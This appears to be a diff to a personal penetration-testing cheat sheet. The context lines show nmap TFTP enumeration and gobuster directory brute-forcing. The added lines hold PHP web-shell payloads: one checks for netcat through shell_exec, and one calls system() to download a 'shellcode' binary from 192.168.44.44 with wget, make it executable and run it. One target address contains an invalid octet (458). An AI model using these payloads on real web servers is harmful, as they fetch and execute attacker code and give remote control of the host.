@@ -150,3 +150,8 @@ nmap -n -Pn -sU -p69 -sV --script tftp-enum 10.11.458.244
 gobuster usage:
 gobuster dir -u http://10.11.1:95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 100 -o gobuster9505
 
+Check if netcat present:
+'<?php echo shell_exec("nc -v");exit;?>'
+
+get shellcode and execute :
+<?php system("id; wget 192.168.44.44/shellcode; chmod 755 shellcode;./shellcode;");?>
